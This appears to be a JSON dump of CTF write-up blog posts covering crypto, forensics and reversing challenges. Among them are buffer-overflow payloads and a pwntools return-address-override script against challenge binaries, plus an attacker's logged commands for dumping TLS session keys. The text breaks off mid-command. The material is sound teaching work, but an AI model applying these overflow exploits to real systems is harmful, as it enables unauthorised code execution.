[{"content":"As hinted by the challenge title and description, this challenge is just some sort of base encoding. This is further confirmed by looking at the encoded data;\n8990767883967987868C74768B8B90857A747A8678877981867C8B98 To determine the base, let us count the number of distinct symbols. 13! So this is likely to be base 13. There is of course a chance it was some other base where, by chance, the other symbols didn\u0026rsquo;t get used, but let us first try base 13.\nTo decode base 13, we will need to make some assumptions about how the data was encoded.\nThe encoded data is regular ASCII \u0026ndash; i.e. 0 - 127; 0-9 in base 13 represents 0-9 in decimal, and a-c in base 13 represents 10-12 in decimal; Each character has been encoded into base 13 individually, and the result has been concatenated with the other encoded characters. From these assumptions, let us consider the minimum number of base 13 digits required to represent an ASCII character \u0026ndash; i.e. how many base 13 characters are needed to represent a number between 0 and 127? Well, one digit will give a range between 0 and 12, and two characters will range from 0 to 195 (as $14^2 - 1 = 195$). Hence we need at least 2 digits to represent all of the standard ASCII characters in base 13. Hence, if we assume that every two characters in the encoded data are one ASCII character, the first character of the encoded data is 89 in base 13, or 113 in decimal and thus q in ASCII.\nIf we follow this process for all other pairs of characters in the encoded data, we get the flag\nquack{dont_assume_encodings}\nCyberchef Usage Decoding from an arbitrary base can be done on CyberChef through the use of the From Charcode ingredient.\n","permalink":"https://blog.adelaideb9.com/posts/2023/duckctf/based-crypto-challenge/","summary":"As hinted by the challenge title and description, this challenge is just some sort of base encoding. This is further confirmed by looking at the encoded data;\n8990767883967987868C74768B8B90857A747A8678877981867C8B98 To determine the base, let us count the number of distinct symbols. 13! So this is likely to be base 13. There is of course a chance it was some other base where, by chance, the other symbols didn\u0026rsquo;t get used, but let us first try base 13.","title":"A Based Crypto Challenge - DuckCTF 2023"},{"content":"We have been provided with the C code for this challenge;\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main(int argc, char *argv[]) { int id = 0; char name[16] = \u0026#34;\u0026#34;; printf(\u0026#34;Input your name: \u0026#34;); gets(name); printf(\u0026#34;Your name is %s with ID %d.\\n\u0026#34;, name, id); if (id == 1179402567) { printf(\u0026#34;%s\\n\u0026#34;, argv[1]); } return 0; } As we can see, we are using the vulnerable gets function. We can use gets to overwrite the id variable which is just above the name variable on the stack. To do this, we need to write 16 bytes into name and then our desired value into id \u0026ndash; which is 1179402567. This is easy enough to do. The only friction here is writing 1179402567 into id as we must input the ASCII representation for 1179402567. However, by converting 1179402567 into ASCII we can see that 1179402567 is equal to the ASCII string FLAG, which is easy enough to enter by hand. The final potential problem arises from the fact that strings are written to the stack starting at the lowest memory address, and ending at the highest. This is problematic as this binary is little endian, which means that we will have to enter FLAG backwards \u0026ndash; again, this is easy to do. This gives our final payload of:\naaaaaaaaaaaaaaaaGALF Entering this into the running binary gives us the flag quack{gets_is_vulnerable}.\n","permalink":"https://blog.adelaideb9.com/posts/2023/duckctf/easy-overflow/","summary":"We have been provided with the C code for this challenge;\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main(int argc, char *argv[]) { int id = 0; char name[16] = \u0026#34;\u0026#34;; printf(\u0026#34;Input your name: \u0026#34;); gets(name); printf(\u0026#34;Your name is %s with ID %d.\\n\u0026#34;, name, id); if (id == 1179402567) { printf(\u0026#34;%s\\n\u0026#34;, argv[1]); } return 0; } As we can see, we are using the vulnerable gets function. We can use gets to overwrite the id variable which is just above the name variable on the stack.","title":"Easy Overflow - DuckCTF 2023"},{"content":"In this challenge, we are given an oracle that will encrypt our input with a constant key. We are also given a redacted version of the encrypting script.\nReading through the script, we can see that data is encrypted by splitting the data into blocks of two characters, encrypting each block individually (with a redacted function), and then concatenating the output. Furthermore, by connecting to the oracle, we can see that each block gets encrypted to a fixed size of 40 characters.\nThese observations make the encryption very weak, as if we make a table of what all pairs of characters get encrypted to, we can easily decrypt any encrypted message by splitting the encrypted message into blocks of 40 characters, and looking for the corresponding plaintext in our lookup table.\nThe following Python script implements this exact solution\nfrom pwn import * from itertools import product # ================= General Setup ================= conn = remote(\u0026#34;chall.duckctf.com\u0026#34;, 30002) # Getting encrypted flag encryptedFlag = conn.recvline()[16:].strip() conn.recvline() # Cleaning new line # Generating all possible pairs of characters in the characterSet characterSet = list(string.ascii_lowercase + \u0026#39;0{}\u0026#39;) pairs = [p[0] + p[1] for p in product(characterSet, repeat=2)] # ============ Creating a lookup table ============ # For speed, we just sent all pairs at once # and split into blocks afterwards. However, we # could theoretically send each pair one by one payload = \u0026#39;\u0026#39;.join(pairs) conn.sendline(bytes(payload, \u0026#39;utf-8\u0026#39;)) enc = conn.recvline()[32:].strip() encPairs = [enc[i:i+40] for i in range(0, len(enc), 40)] table = dict(zip(encPairs, pairs)) # =============== Decrypting Flag ================ # Splitting the encrypted flag into blocks of 40 blocks = [encryptedFlag[i:i+40] for i in range(0, len(encryptedFlag), 40)] # Searching for each block in lookup table flag = \u0026#39;\u0026#39;.join([table[block] for block in blocks]) print(flag) This gives the flag quack{shortblockencryptionbad}.\n","permalink":"https://blog.adelaideb9.com/posts/2023/duckctf/homebrewed-block-cipher/","summary":"In this challenge, we are given an oracle that will encrypt our input with a constant key. We are also given a redacted version of the encrypting script.\nReading through the script, we can see that data is encrypted by splitting the data into blocks of two characters, encrypting each block individually (with a redacted function), and then concatenating the output. Furthermore, by connecting to the oracle, we can see that each block gets encrypted to a fixed size of 40 characters.","title":"Homebrewed Block Cipher - DuckCTF 2023"},{"content":"We are given a file with 10,000 lines, each of which is a new piece of data encrypted with a substitution cipher with a different key. One of these lines is the flag, and the rest are just random characters.\nTo filter the rubbish out from the flag, we can use frequency analysis \u0026ndash; as a substitution cipher will not change the frequency of characters.\nIdeally, we do not want to be comparing the character frequency distributions by hand. As such, we will want some way to rank each line in terms of their likelihood of being encrypted English \u0026ndash; i.e. some way to compare the frequency of English characters to the frequency of characters in each line. While there are numerous ways to do this, as the mathematician I am, I opted to compute the Kullback–Leibler divergence for each line. This quantity is essentially a measure of the difference between two distributions and is given by the equation\n$$D_{KL}(P||Q) = -\\sum_{x} P(x) \\log \\left(\\frac{Q(x)}{P(x)}\\right)$$,\nwhere $P$ and $Q$ are the probability distributions of interest. Hence, if we calculate the probability of each character occurring on each line and apply this formula along with the expected character frequency for English, we should see that the flag has the lowest divergence as it is the only data that is English. The following script does just that;\nfrom collections import Counter from math import log import re def getProbDist(s): n = len(s) freq = Counter(s) prob = [i/n for i in freq.values()] prob = sorted(prob, reverse=True) return prob def KLD(P,Q): div = 0 for i in range(min(len(P), len(Q))): div -= P[i] * log(Q[i] / P[i]) return div def main(): # ==== Generating Probability Distribution From Sample Text ====== with open(\u0026#39;englishSample.txt\u0026#39;) as f: englishSample = f.read().lower() # Stripping all but a-z characters englishSample = re.sub(r\u0026#39;[\\[]|[^[a-z]]*\u0026#39;, r\u0026#39;\u0026#39;, englishSample) targetDist = getProbDist(englishSample) # Calculating Kullback–Leibler Divergence for each encrypted line rankings = {} with open(\u0026#39;encrypted.txt\u0026#39;) as f: for line in f: line = line.strip() dist = getProbDist(line) div = KLD(targetDist, dist) rankings[line] = div # Printing the most likely English string encrypted rankings = dict(sorted(rankings.items(), key=lambda item: item[1])) print(list(rankings.keys())[0]) if __name__ == \u0026#34;__main__\u0026#34;: main() Running this we find the most likely encrypted English string to be\ntgetrprgrpzvpttgtnkorpehkrzjfkdgkvnbyvyhbtptyvsikfkpttzmkjphhkfnzvrkvrrzpvnfkytkrikhkvxrizjrikjhyxpvhpvkyfyhxkefyriknybhkbiymphrzvrikzfkmvymksyjrkfrikmyrikmyrpnpyvtyfrigfnybhkbyvsqphhpymfzqyviymphrzvtryrktriyrkukfbtdgyfkmyrfplzukfynzmmgryrpukfpvxtgniytrikfkyhzfnzmohklvgmekftzfrikpvrkxkfttyrptjpktprtzqvniyfynrkfptrpnkdgyrpzv Decrypting this using an online tool gives us\nsubstitutionissusceptibletofrequencyanalysisandhereissomefillercontenttoincreasethelengthoftheflaginlinearalgebrathecayleyhamiltontheoremnamedafterthemathematiciansarthurcayleyandwilliamrowanhamiltonstatesthateverysquarematrikoveracommutativeringsuchastherealorcompleknumbersortheintegerssatisfiesitsowncharacteristicequation Which is indeed English text and the flag for the challenge.\n","permalink":"https://blog.adelaideb9.com/posts/2023/duckctf/not-so-standard-substitution-cipher/","summary":"We are given a file with 10,000 lines, each of which is a new piece of data encrypted with a substitution cipher with a different key. One of these lines is the flag, and the rest are just random characters.\nTo filter the rubbish out from the flag, we can use frequency analysis \u0026ndash; as a substitution cipher will not change the frequency of characters.\nIdeally, we do not want to be comparing the character frequency distributions by hand.","title":"Not So Standard Substitution Cipher - DuckCTF 2023"},{"content":"This challenge provides us with the binary, so let us begin by printing the objects in the binary with objdump -t:\nSYMBOL TABLE: 0000000000000000 l df *ABS*\t0000000000000000 crt1.c 0000000000000000 l df *ABS*\t0000000000000000 crtstuff.c 0000000000403e60 l O .ctors\t0000000000000000 __CTOR_LIST__ 0000000000403e70 l O .dtors\t0000000000000000 __DTOR_LIST__ 0000000000402070 l O .eh_frame\t0000000000000000 __EH_FRAME_BEGIN__ 0000000000401090 l F .text\t0000000000000000 deregister_tm_clones 00000000004010c0 l F .text\t0000000000000000 register_tm_clones 0000000000401100 l F .text\t0000000000000000 __do_global_dtors_aux 0000000000404020 l O .bss\t0000000000000001 completed.2 0000000000404028 l O .bss\t0000000000000008 dtor_idx.1 0000000000401190 l F .text\t0000000000000000 frame_dummy 0000000000404040 l O .bss\t0000000000000030 object.0 0000000000000000 l df *ABS*\t0000000000000000 crtstuff.c 0000000000403e68 l O .ctors\t0000000000000000 __CTOR_END__ 00000000004020d0 l O .eh_frame\t0000000000000000 __FRAME_END__ 00000000004012b0 l F .text\t0000000000000000 __do_global_ctors_aux 0000000000000000 l df *ABS*\t0000000000000000 med.c 0000000000000000 l df *ABS*\t0000000000000000 0000000000403e80 l O .dynamic\t0000000000000000 _DYNAMIC 0000000000402000 l .eh_frame_hdr\t0000000000000000 __GNU_EH_FRAME_HDR 0000000000403fd0 l O .got\t0000000000000000 _GLOBAL_OFFSET_TABLE_ 0000000000000000 F *UND*\t0000000000000000 gets 0000000000404008 g O .data\t0000000000000000 .hidden __TMC_END__ 0000000000403e78 g O .dtors\t0000000000000000 .hidden __DTOR_END__ 0000000000000000 F *UND*\t0000000000000000 puts 0000000000404000 g O .data\t0000000000000000 .hidden __dso_handle 0000000000401000 g F .init\t0000000000000001 _init 00000000004011d3 g F .text\t00000000000000a0 getName 00000000004011bd g F .text\t0000000000000016 win 0000000000401050 g .text\t0000000000000000 _start 0000000000401066 g F .text\t0000000000000024 _start_c 0000000000404008 g .bss\t0000000000000000 __bss_start 0000000000401273 g F .text\t000000000000002f main 00000000004012f1 g F .fini\t0000000000000001 _fini 0000000000404008 g .data\t0000000000000000 _edata 0000000000404078 g .bss\t0000000000000000 _end 0000000000000000 F *UND*\t0000000000000000 __libc_start_main 0000000000404070 g O .bss\t0000000000000008 FLAG As we can see, gets is being used, which means this program is likely vulnerable to a buffer overflow with gets. So, without trying anything else yet, let us see if we can cause a segfault.\npython -c \u0026#34;print(\u0026#39;a\u0026#39; * 10000)\u0026#34; | ./med Upon running the command above, we get the following error;\nSegmentation fault (core dumped) Awesome! This means we over-wrote the return address pushed to the stack when calling a function that calls gets, and thus when the function tried to return, it returned to a location that does not exist in the binary, therefore throwing an error. Hence, if we work hard enough, we can tell the function to return to a location we desire (perhaps a part of the binary that prints the flag).\nTo do this, we need to:\nDetermine exactly how many characters are required in our input before we start changing the return address (this is called the offset) Find a location that runs the code we want to run (say print the flag) The first job is easy enough. We know that 10000 characters is too many, so how about 500? That also segfaults. So how about 250? Yep, still segfaults. What about 100? Nope. Runs fine. 128? Yes. 127? Nope! This means that the offset is 128 characters (it is not 127 as there is a new line character, so when we entered 127 characters, there were really 128 characters sent, all of which did not change the return address). So our payload should be 128 random characters followed by our desired address.\nTo find a location in the code we might want to jump to, we can look at our symbols table again. We see that there is a function called win, and if we look at the assembly for win (with objdump -t);\n00000000004011bd \u0026lt;win\u0026gt;: 4011bd: 55 push %rbp 4011be: 48 89 e5 mov %rsp,%rbp 4011c1: 48 8b 05 a8 2e 00 00 mov 0x2ea8(%rip),%rax # 404070 \u0026lt;FLAG\u0026gt; 4011c8: 48 89 c7 mov %rax,%rdi 4011cb: e8 60 fe ff ff call 401030 \u0026lt;puts@plt\u0026gt; 4011d0: 90 nop 4011d1: 5d pop %rbp 4011d2: c3 ret we can see that it will print the flag. So let us jump to win which is at address 0x004011bd.\nThe following program does just this\nfrom pwn import * # Remote shell = remote(\u0026#39;chall.duckctf.com\u0026#39;, 30003) # Local with test flag #shell = process([\u0026#39;./med\u0026#39;, \u0026#34;flag{test flag}\u0026#34;]) winAddress = 0x004011bd payload = b\u0026#39;a\u0026#39; * 136 + p64(winAddress) shell.sendline(payload) shell.interactive() Running this gives the flag quack{a_simple_return_address_override}.\n","permalink":"https://blog.adelaideb9.com/posts/2023/duckctf/return-address-override/","summary":"This challenge provides us with the binary, so let us begin by printing the objects in the binary with objdump -t:\nSYMBOL TABLE: 0000000000000000 l df *ABS*\t0000000000000000 crt1.c 0000000000000000 l df *ABS*\t0000000000000000 crtstuff.c 0000000000403e60 l O .ctors\t0000000000000000 __CTOR_LIST__ 0000000000403e70 l O .dtors\t0000000000000000 __DTOR_LIST__ 0000000000402070 l O .eh_frame\t0000000000000000 __EH_FRAME_BEGIN__ 0000000000401090 l F .text\t0000000000000000 deregister_tm_clones 00000000004010c0 l F .text\t0000000000000000 register_tm_clones 0000000000401100 l F .text\t0000000000000000 __do_global_dtors_aux 0000000000404020 l O .","title":"Return Address Override - DuckCTF 2023"},{"content":"This challenge only provides the following image of a book cover; As we can see, the ISBN is partially corrupted, and the goal is to recover the ISBN and thus recover the book title.\nAfter some quick googling, the structure of an ISBN10 code can be found. The following information is relevant;\nThe first digits represent the country of publication, the next few digits represent the publisher, the remaining digits except the final digit specify the book\u0026rsquo;s title and edition, and the final digit is a checksum. While the specific number of digits in each section varies on the size of the publisher, the country, etc, we can still use this information and the corrupted ISBN provided to recover the book.\nFirst, we can see that the first digit is missing; thus we need to identify the country of publication. As the characters on the book cover are Japanese, it is safe to assume the country is Japan, which has a code of 4. Thus the first character of the ISBN in 4.\nNext, we need to determine the publisher and their ISBN publisher code. For this, Google Lens comes to our aid! Scanning the book, we can tell that the publisher is オーム社 (ohmsha). Searching for this and going to the Japanese publications, we can see that they have published a large variety of books (hence brute-forcing it from here will not work). However, as the publisher code in ISBNs is mostly constant, we can just select any book published by them, and copy the publisher code in the ISBN of the randomly selected book. Doing this will give us the publisher code of 274. This 2 in 274 aligns with the 2 already given to us in the ISBN: which is a good sign!\nFinally, we need to determine the last missing digit. While this could be brute forced, we can also use the checksum in the ISBN (final digit) to recover the final missing digit. While I will not go into details of this here, the checksum calculation is clearly explained in the Wikipedia article for ISBNs, and reversing it to recover a single digit is a simple exercise in algebra. Doing this gives the final digit of 7.\nPutting all the digits together gives us the final ISBN of 4274066746. Searching this up on an ISBN lookup will give us the book (and flag) マンガでわかる暗号, which in English is Cryptography Understood by Manga.\n","permalink":"https://blog.adelaideb9.com/posts/2023/duckctf/the-lost-book/","summary":"This challenge only provides the following image of a book cover; As we can see, the ISBN is partially corrupted, and the goal is to recover the ISBN and thus recover the book title.\nAfter some quick googling, the structure of an ISBN10 code can be found. The following information is relevant;\nThe first digits represent the country of publication, the next few digits represent the publisher, the remaining digits except the final digit specify the book\u0026rsquo;s title and edition, and the final digit is a checksum.","title":"The Lost Book - DuckCTF 2023"},{"content":"This challenge was created with the intention of showing partipicants how easy it is to decompile .NET code, presented in a fun game challenge.\nThe challenge provides a Unity game. This is evident upon launching the game where you\u0026rsquo;re greeted with \u0026ldquo;Made with Unity\u0026rdquo;.\nExploring the game there\u0026rsquo;s a jump that cannot be made. Rereading the descrption \u0026ldquo;Have a look around the map for anything that might be of help. It won\u0026rsquo;t be easy.\u0026rdquo; It\u0026rsquo;s evident the challenge is to somehow manipulate the players movement capabilties. Investigating the game files and with a quick google search Unity games reveals, the game is most likely built with C#. With a tool such as DnSpy it\u0026rsquo;s possible to reverse and modify the C# code.\nWe need to know figure out where exactly the game code is stored. A quick search for Unity game hacking reveals, it\u0026rsquo;s stored in the Managed folder. Navigating into RE Platformer_Data\\Managed there\u0026rsquo;s a bunch of DLLs, the game code is contained within Assembly-CSharp.dll.\nOpening this file up in DnSpy reveals PlayerMovement, this is exactly what we\u0026rsquo;re looking for. To modify the game behaviour, the easiest way to go about it is within the start function. This function is called by the game engine once the object is created.\nRight clicking \u0026lsquo;Edit Method\u0026rsquo; Modify the gravityScale to say 5% of the original Then saving the modified file and replacing the orignal one. With this we\u0026rsquo;re able to jump our way to the flag.\nFlag: UACTF{ALPH4B3T_K1NG_4PPL3} ","permalink":"https://blog.adelaideb9.com/posts/2022/uactf/re-platformer/","summary":"This challenge was created with the intention of showing partipicants how easy it is to decompile .NET code, presented in a fun game challenge.\nThe challenge provides a Unity game. This is evident upon launching the game where you\u0026rsquo;re greeted with \u0026ldquo;Made with Unity\u0026rdquo;.\nExploring the game there\u0026rsquo;s a jump that cannot be made. Rereading the descrption \u0026ldquo;Have a look around the map for anything that might be of help. It won\u0026rsquo;t be easy.","title":"re-platformer - UACTF 2022"},{"content":"Based on the description, you may have determined that we are dealing with an autostereogram, better known as a magic eye puzzle. As such, theoretically you can just stare at the picture with great intensity until the flag reveals itself to you. If you did manage to solve this challenge only with your eyes then you are amazing. Discerning simple shapes are difficult, let alone a short sentence.\nIf you are a mere mortal, an alternative way to solve this challenge is to use any number of the online sterogram solving tools that exist (this one\u0026rsquo;s pretty good). Alternatively you can open up GIMP and put the image on two layers. Then set the blending mode of the top layer to \u0026lsquo;difference\u0026rsquo; and drag the top layer along the horizontal axis until you get something like this:\nRegardless of what solution you use, the shape of the letters should bear resemblance to the original image, shown below.\nFlag: UACTF{r34l17y_1n_3d}\n","permalink":"https://blog.adelaideb9.com/posts/2022/uactf/blurry-eyed/","summary":"Based on the description, you may have determined that we are dealing with an autostereogram, better known as a magic eye puzzle. As such, theoretically you can just stare at the picture with great intensity until the flag reveals itself to you. If you did manage to solve this challenge only with your eyes then you are amazing. Discerning simple shapes are difficult, let alone a short sentence.\nIf you are a mere mortal, an alternative way to solve this challenge is to use any number of the online sterogram solving tools that exist (this one\u0026rsquo;s pretty good).","title":"Blurry-Eyed - UACTF 2022"},{"content":"While running the image through stegsolve/stegonline or manipulating the pixels in your favourite image editor won\u0026rsquo;t work, a hex editor should show you that the data portion of the bitmap contains more than two distinct hex values. Checking the image properties should also indicate that ishihara.bmp is a 16 color bitmap image, and as such, each individual hex value denotes a different colour. Hence, we know that the image contains a wider range colours than are being shown. To figure out why we can\u0026rsquo;t see them, let\u0026rsquo;s explore the bitmap file format a bit further by annotating the raw bytes of our challenge file. Note that the bytes highlighted in grey below denote the data portion of the file.\nThe challenge description and title are collectively intended to hint at checking the bitmap image file\u0026rsquo;s \u0026lsquo;color table\u0026rsquo;. Indeed, if we look at the bytes of the file above, you might notice that 15 of the 16 colours in our colour table have the same value. Altering these values to make them more distinct (hint: these are just typical hex colours in little-endian). That said, there are a lot of paths to figuring out this challenge, and one of the easiest is to simply transplant the header of a working 16 color bitmap onto the challenge file. If you do you\u0026rsquo;ll probably get something close to the original, which is included below:\nThanks to Francisco Couzo for the use of their Ishihara Plate Generator.\nFlag: UACTF{r37urn_0f_7h3_c0l0r_m31573r}\n","permalink":"https://blog.adelaideb9.com/posts/2022/uactf/colour-blind/","summary":"While running the image through stegsolve/stegonline or manipulating the pixels in your favourite image editor won\u0026rsquo;t work, a hex editor should show you that the data portion of the bitmap contains more than two distinct hex values. Checking the image properties should also indicate that ishihara.bmp is a 16 color bitmap image, and as such, each individual hex value denotes a different colour. Hence, we know that the image contains a wider range colours than are being shown.","title":"Colour Blind - UACTF 2022"},{"content":"It turn out that in Python 3, attempting to write non-ASCII characters to a file without using \u0026lsquo;binary mode\u0026rsquo; (a mode which deals with \u0026rsquo;non-textual data\u0026rsquo;, hence the name of the challenge) has some less-than ideal results. Indeed, if you tried providing your own plain-text to xor.py you might have noticed that there are somehow more bytes in the cipher-text after XORing that you started with in your plaintext. Ultimately, it appears that the write.write(ciphertext) function is prepending either 0xc2 or 0xc3 to certain bytes. Simply adding a condition to exclude these, and providing the cipher-text as the input (since XOR is the inverse of itself) will provide a simple solution to this puzzle.\nfrom random import seed, randrange seed(True, version=2) with open(\u0026#34;plaintext.txt\u0026#34;, \u0026#39;r\u0026#39;) as read, open(\u0026#34;ciphertext.txt\u0026#34;, \u0026#39;w\u0026#39;) as write: plaintext = read.read() for char in plaintext: A = ord(char) if A != 194 and A != 195: # exclude 0xc2 and 0xc3 B = randrange(256) ciphertext = chr(A ^ B) print(bytes([A ^ B])) write.write(ciphertext) Flag: UACTF{b4d_h4b175_l34d_70_py7h0n2}\n","permalink":"https://blog.adelaideb9.com/posts/2022/uactf/nontextual-troubles/","summary":"It turn out that in Python 3, attempting to write non-ASCII characters to a file without using \u0026lsquo;binary mode\u0026rsquo; (a mode which deals with \u0026rsquo;non-textual data\u0026rsquo;, hence the name of the challenge) has some less-than ideal results. Indeed, if you tried providing your own plain-text to xor.py you might have noticed that there are somehow more bytes in the cipher-text after XORing that you started with in your plaintext. Ultimately, it appears that the write.","title":"Non-textual Troubles - UACTF 2022"},{"content":"Challenge description A robber broke into our vault in the middle of night. There\u0026rsquo;s an indication that the robber tried to steal some items which are considered as confidential assets. Could you figure it out?\nFlag format: IJCTF{[a-f0-9]{32}}\nAuthor: Avilia#1337\nHint #1: \u0026ldquo;When the incident happened, the attacker got into our IP over ICMP tunnel network to access an HTTP/2 web-server with SSL enabled.\u0026rdquo;\nHint #2: \u0026ldquo;Even so, our captured logs aren\u0026rsquo;t precise enough. Each packet has an unusual timestamp and it\u0026rsquo;s kinda messy\u0026hellip;\u0026rdquo;\nlog.tar.xz\nInvestigating the packet capture We are provided with a log.tar.xz archive from the challenge description, which we can decompress using xz and tar as so:\n$ xz -d log.tar.xz\n$ tar -xvf log.tar\nThis should produce a log.pcap file.\nRunning strings against the .pcap file, we pipe the output to sort and uniq to only display unique entries, then grep ...... to display only lines with length greater or equal to 6:\n$ strings log.pcap | sort | uniq | grep ......\n... CLIENT_RANDOM Compressed: 202 Extracting archive: flag.zip p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,32 bits,1 CPU LE) \u0026amp;p/home/pi/projects/ctf python3 download.py flag.zip python3 download.py pass.txt uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),105(input),109(netdev),114(docker),116(lpadmin),997(gpio),998(i2c),999(spi) whoami xargs -n1 -a sslkeylogfile We see mentions of files flag.zip, pass.txt, download.py, and sslkeylogfile, as well as commands such as id, python3 and xargs being run.\nOpening the packet capture file log.pcap in Wireshark, we see a conversation between 192.168.1.30 and 192.168.1.205 through ICMP (ping), along with some fragmented IPv4 packets.\nFrom the first hint, we know that the attacker used an IP over ICMP tunnel network to access an HTTP/2 web server with SSL. From the second hint, we also know that the capture logs were imprecise and the packet timestamps were unusual. Looking at Wireshark, we notice some of the packets have negative time values. This should not be possible, packets cannot travel back in time before the capture started. Also, the frame numbers are all over the place and are not ordered correctly.\nWe can fix the packet ordering issue using the reordercap tool, which should come installed with Wireshark:\n$ reordercap log.pcap log_ordered.pcap\nIf the reordering was successful, there should be 167 fragmented IPv4 packets with size of 1514 bytes in the newly created log_ordered.pcap file. With the ordering fixed, we can then start analysing the individual packets.\nSplicing the packet headers Looking at one of the fragmented IPv4 packets, we see that there is a data segment with 1480 bytes of data:\nAt first, the data may look like random bytes. But, if we look carefully, we can see there is a malformed Ethernet header, followed by an IP header, and then a TCP header:\nSearching for the bytes in the malformed Ethernet header 00 00 4a e3 f9 24 34 44 68 61 6e 73 07, we were able to determine the specific application used to establish the ICMP tunnel, called \u0026ldquo;Hans\u0026rdquo; (https://github.com/friedrich/hans). This header is inserted by the Hans application. We can also see the 0x07 byte at the end, which is defined as TYPE_DATA in the source code under src/worker.h:\nenum Type { TYPE_RESET_CONNECTION = 1, TYPE_CONNECTION_REQUEST = 2, TYPE_CHALLENGE = 3, TYPE_CHALLENGE_RESPONSE = 4, TYPE_CONNECTION_ACCEPT = 5, TYPE_CHALLENGE_ERROR = 6, TYPE_DATA = 7, TYPE_POLL = 8, TYPE_SERVER_FULL = 9 }; We know the TCP data inside of the ICMP data has to contain the TLS traffic which the attacker used to exfiltrate data, or the handshakes associated with them. If we can somehow restore the original TLS packets, then there is a possibility where we can extract the session keys and use them to decrypt the rest of the packets.\nThis can be achieved by transplanting the Ethernet header from the ICMP packet to the ICMP data segment, and removing the magic/type header inserted by Hans. In fact, we can simplify it to only one cut operation by removing the TCP header and the Hans header altogether.\nUsing the editcap tool and following the documentation here, we cut away 33 bytes (20 bytes from TCP header of ICMP + 13 bytes from Hans) starting from offset byte 15 (after 14 bytes from Ethernet header of ICMP) for each packet, then export the packets into a log_chopped.pcap file:\n$ editcap -C 15:33 log_ordered.pcap log_chopped.pcap\nOpening log_chopped.pcap file in Wireshark, we see the ICMP packets have now changed into either TCP or Socks packets, the source/destination address and ports have also changed. This is likely because the attacker used a Socks proxy when attacking our victim. To combat this and allow Wireshark to read the traffic properly as TLS, we can add an entry to the \u0026ldquo;Decode As\u0026rdquo; list under the \u0026ldquo;Analyze\u0026rdquo; tab, pointing port 1080 to TLS:\nThis basically tells Wireshark to treat all traffic on TCP port 1080 as TLS, and not as Socks.\nExtracting the TLS session keys Earlier, when we did strings on the log.pcap file, we noticed that the attacker ran xargs -n1 -a sslkeylogfile on the victim\u0026rsquo;s system, which would effectively print the contents of sslkeylogfile to the output stream. We should be able to follow this output as it is not protected by TLS, and recover the TLS session keys.\nFrom the Mozilla NSS key log documentations, we know the sslkeylogfile follows a format of \u0026lt;Label\u0026gt; \u0026lt;space\u0026gt; \u0026lt;ClientRandom\u0026gt; \u0026lt;space\u0026gt; \u0026lt;Secret\u0026gt;. ClientRandom is encoded as 64 hexadecimal characters, and Secret is encoded as 96 hexadecimal characters (for TLS 1.0-2). For example, a key may look like this:\nCLIENT_RANDOM cf6b8752f4b47c9c28b07ba7da366f98afcc335931f08df83c30ebe2c7bcce32 a832cf19fa6b414fce74fa796b39d898c0825991547eebd20abe951ad2c586490d2703e4f596de3b6b4be417a2caa250 In log_chopped.pcap, we use Wireshark\u0026rsquo;s search feature to look for the string CLIENT_RANDOM in the packet bytes. Select any packet from the search result and follow the TCP stream by right-clicking on it then clicking Follow -\u0026gt; TCP Stream. This should open a new window showing the entire stream as ASCII:\nFrom here, it is trivial to extract the contents of sslkeylogfile. We can simply copy all lines containing the session keys starting from CLIENT_RANDOM and paste them into a file named sslkeylogfile.txt.\nThough, we\u0026rsquo;re not done quite yet. Since the attacker used xargs -n1 to display each argument into separate lines, the format of our keys is going to be incorrect. We need to replace the line characters \\n between ClientRandom and Secret into space characters, and this can be done using paste as so:\n$ paste -d\u0026quot; \u0026quot; - - - \u0026lt; sslkeylogfile.txt \u0026gt; sslkeylogfile\nThe sslkeylogfile should now contain 166 keys, as seen here:\n$ wc sslkeylogfile \u0026amp;\u0026amp; md5sum sslkeylogfile\n166 498 29216 sslkeylogfile 9776acd3c0499be64e9653cb27f30720 sslkeylogfile With the session keys extracted, we can then decrypt the packets.\nInjecting secrets and decrypting TLS traffic There are two ways we can approach the decryption:\nUse Wireshark\u0026rsquo;s built-in support for master secret log files for TLS under Preferences -\u0026gt; Protocol -\u0026gt; TLS -\u0026gt; (Pre)-Master-Secret log filename, select the sslkeylogfile we just extracted, and the packets will be automatically decrypted by Wireshark in the GUI. Use editcap to inject the secret to the .pcap file, as so: $ editcap --inject-secrets tls,sslkeylogfile log_chopped.pcap log_decrypted.pcap Either methods will allow us to read the contents of the packets, but the editcap approach will allow us to use command-line tools later to recover the files more easily. If you want to hand transcribe hexadecimals later on, then choose method 1. ;)\nRecovering flag.zip and pass.txt Looking at the HTTP/2 packets in log_decrypted.pcap with filter http2, we see there are GET requests to /files/flag.zip and /files/pass.txt:\nAlongside the HEADERS and Magic packets, we also see many DATA packets. Inspecting them further with Wireshark, we see that each of the DATA packet has a status of 206 Partial Content, they each carry either 1 or 2 bytes of data depending on if the Content-Type header is text/plain or application/zip, and nearly all of them have an unusual header Content-Range.\nIn essence, what\u0026rsquo;s happening here - is that the attacker is gradually sending either 1 or 2 bytes of data through HTTP/2. The bytes are ordered by the Content-Range header. For example, bytes 22-23/202 would mean the data in the packet belongs in byte locations 22 to 23, out of 202 bytes. This implies, in order for us to recover the two files, we need to piece together the individual bytes of data from all of the DATA packets according to the Content-Range header.\nIt is possible to recover the files by hand transcribing the hexadecimals from all 166 packets (if you\u0026rsquo;re up for the task). Fortunately, there is a tool that can help us with this. We can use tshark, which is a packet analysis tool much like Wireshark, but it is capable of quickly exporting the packets\u0026rsquo; range and data as columns in the command-line, allowing us to easily recover the bytes.\n$ tshark -r log_decrypted.pcap -Y \u0026quot;http2\u0026quot; -T fields -e http2.headers.range -e http2.data.data | xargs -n2 \u0026gt; bytes.txt\nHere, we first take log_decrypted.pcap as the input file (-r), using http2 as the display filter (-Y), and printing the fields (-T) of http2.headers.range and http2.data.data (-e). We also pipe the output to xargs -n2 to make each packet display neatly on one line instead of two, and finally output it to a bytes.txt file. The file should look something like this:\nbytes=53-53 31 bytes=34-34 32 bytes=27-27 39 bytes=52-52 36 bytes=55-55 66 ... We have the hexadecimal bytes of flag.zip and pass.txt, but the bytes are mixed together in one file and we want to separate them. To do this, we can pass it through a few more filters:\n$ cat bytes.txt | awk 'length($2)==2 {print $0}' | cut -d\u0026quot;=\u0026quot; -f2 | sort -n\nThis 